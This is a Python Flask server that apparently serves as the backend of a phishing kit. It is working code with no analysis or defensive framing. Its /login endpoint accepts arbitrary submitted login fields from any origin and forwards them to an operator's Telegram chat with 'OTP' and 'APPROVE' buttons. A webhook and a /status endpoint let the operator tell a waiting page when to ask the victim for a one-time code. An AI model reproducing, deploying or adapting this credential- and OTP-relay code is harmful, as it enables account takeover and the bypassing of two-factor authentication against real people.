from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import json
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

@app.after_request
def after_request(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_STATUS = {}

# ================= TELEGRAM =================
def send_to_telegram(data, session_id):
    msg = "🔐 LOGIN\n\n"
    for k, v in data.items():
        msg += f"{k}: {v}\n"
    msg += f"\nSESSION: {session_id}"

    keyboard = {
        "inline_keyboard": [
            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp"}],
            [{"text": "✅ APPROVE", "callback_data": f"{session_id}:approved"}]
        ]
    }

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={
            "chat_id": CHAT_ID,
            "text": msg,
            "reply_markup": json.dumps(keyboard)
        }
    )

# ================= LOGIN =================
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json() or {}

    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = "pending"

    print("NEW SESSION:", session_id)

    send_to_telegram(data, session_id)

    return jsonify({
        "success": True,
        "id": session_id
    })

# ================= STATUS =================
@app.route("/status/<session_id>")
def status(session_id):
    status = SESSION_STATUS.get(session_id)

    print("STATUS CHECK:", session_id, status)

    if not status:
        return jsonify({"status": "invalid"})

    return jsonify({"status": status})

# ================= WEBHOOK =================
@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    print("WEBHOOK HIT:", data)

    try:
        if "callback_query" in data:
            callback = data["callback_query"]
            msg = callback["data"]

            session_id, action = msg.split(":")

            print("👉 CLICK:", action)

            # 🔥 HARD FORCE (NO BUG POSSIBLE)
            if action == "otp":
                SESSION_STATUS[session_id] = "otp"

            elif action == "approved":
                SESSION_STATUS[session_id] = "approved"

            else:
                SESSION_STATUS[session_id] = action

            print("✅ UPDATED:", session_id, SESSION_STATUS[session_id])

    except Exception as e:
        print("❌ ERROR:", e)

    return jsonify({"ok": True})

# ================= ROOT =================
@app.route("/")
def home():
    return "SERVER OK"

# ================= RUN =================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
